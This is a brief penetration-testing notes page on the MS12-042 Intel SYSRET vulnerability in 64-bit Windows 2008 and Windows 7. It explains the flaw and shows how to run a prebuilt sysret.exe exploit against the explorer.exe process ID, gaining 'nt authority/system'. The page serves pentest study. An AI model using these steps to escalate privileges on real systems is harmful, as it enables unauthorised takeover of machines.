---
title: intel sysret
category: win privesc
order: 1
---

[WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)


## | ms12-042
This vulnerability allows an attacker to execute code to the kernel (ring0) due to the difference in implementation between processors AMD and Intel. For example an operating system that it is written according to AMD specifications but runs on an Intel hardware is vulnerable. Since the attacker can execute code into the kernel it could allow him to escalate his privileges from user level to system.

Windows environments are vulnerable due to the way that the Windows User Mode Scheduler is handling system requests. This issue affects 64-bit versions of Windows 2008 and Windows 7 that are running on an Intel chip.

&nbsp;
## | run the exploit agains explorer.exe for example  

```
tasklist

explorer.exe  1595   console   1  41.1K
```

```
c:> sysret.exe -pid 1595
c:> whoami
nt authority/system
```
